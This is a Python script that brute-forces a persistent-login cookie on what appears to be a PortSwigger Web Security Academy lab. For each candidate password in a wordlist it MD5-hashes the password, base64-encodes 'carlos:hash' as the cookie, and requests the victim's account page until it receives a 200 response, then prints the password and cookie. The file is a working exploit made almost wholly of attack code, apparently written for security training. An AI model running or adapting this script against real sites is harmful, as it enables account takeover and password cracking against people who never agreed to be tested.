import base64
import subprocess
import hashlib

def encodeB64(str):
    bytes_data = str.encode('utf-8')
    bytes_encoded = base64.b64encode(bytes_data)
    base64_encoded = bytes_encoded.decode('utf-8').strip("=")
    return base64_encoded

def hashMD5(str):
    md5_hash = hashlib.md5(str.encode('utf-8')).hexdigest()
    return md5_hash

def sendRequest(victim, cookie):
    url = f"https://0a1c005703e99d54803e3fde002f0053.web-security-academy.net/my-account?id={victim}" # replace with your own lab id
    res_code = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "GET", url, "-b", f"stay-logged-in={cookie}"], capture_output=True, text=True).stdout
    return int(res_code)

def main():
    cands = open("cand.txt", "r").readlines()
    victim = "carlos"
    for cand in cands:
        paswd_hash = hashMD5(cand.strip())
        cookie = encodeB64(f"{victim}:{paswd_hash}")
        req = sendRequest(victim, cookie)

        if req == 200:
            print(f"password: {cand}, stay-logged-in: {cookie}")
            break

main()
